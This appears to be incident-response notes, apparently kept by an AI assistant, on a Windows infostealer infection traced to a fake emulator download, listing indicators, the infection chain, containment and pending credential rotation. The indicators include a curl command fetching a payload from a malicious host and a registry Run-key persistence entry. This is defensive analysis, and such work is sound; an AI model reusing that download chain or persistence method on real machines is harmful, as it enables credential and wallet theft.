---
name: windows-infection-2026-11-09
description: Windows host infected 2026-11-09 19:10 CST - node+python stealer (fake vscode-bootstrap); found 11-10 via Chrome closing
metadata:
  type: project
---
Found 2026-11-10 ~08:00 CST while debugging "Chrome closes when clicking a link". Chrome quits with exit 0 on
some sites (IMDb), even on a fresh profile = something closing it, not a crash.

IOCs (all created 2026-11-09 19:10:58 CST):
- %TEMP%\nvcache_d83fa630.bat + nvcache_9283a6bd.bat: curl https://tresoctavos.com.mx/.well-known/acme-challenge/bootstrap.php?win=25
  -> %USERPROFILE%\.vscode\vscode-bootstrap.cmd (38 KB, title "Creating new Info", REALTEKAUDIO=<blob>, installs node 22.14 into .vscode\nodejs)
- running C:\Program Files\nodejs\node.exe PID 54880, cmdline rewritten to "0 0 0 25....VUpGantoW3V+..." ; children calc.exe, charmap.exe
- HKCU Run "Microsoft Display Driver Manager" = %LOCALAPPDATA%\Programs\Python\Python399\python3\pythonw.exe exec.py
  (exec.py: from updater import update; update()) - not running yet, starts at next logon
Pattern = BeaverTail/InvisibleFerret ("Contagious Interview" fake VS Code bootstrap): browser creds, wallets.
Launcher process gone; vector unknown (no Claude session matches). Related: [[binance-theft-2026-10-26]] (CursedChrome infra).

**Vector (found):** user downloaded a "Nintendo emulator" from https://lichii.org/downloads/lichii-windows-64-pgo.zip
(2026-11-09 19:09) -> lichii-updater.exe (sha256 c5b199ba...) -> nvcache .bat -> vscode-bootstrap.cmd -> node + Python399.
Node injected into calc.exe (listening :20241) and charmap.exe; node listened on :58853.
**Contained 2026-11-10 ~08:00 CST** with the user's OK ("evidence first, then kill"): dumps + samples + sha256 in
~/malware-lab/evidence/2026-11-10-win-stealer/ (samples non-executable; HKCU-Run-before.reg export); killed
54880/11616/49448, removed the Run key, deleted every dropped file. No other tasks/services/WMI persistence. Chrome on IMDb
works again. Defender full scan started. The 03:00 WSL restart was a WSL update (service reinstalled 03:01), not the malware.
Open: credential rotation from a clean device (it ran ~13 h; assume Chrome, 1Password ext, \\wsl$ files were read).
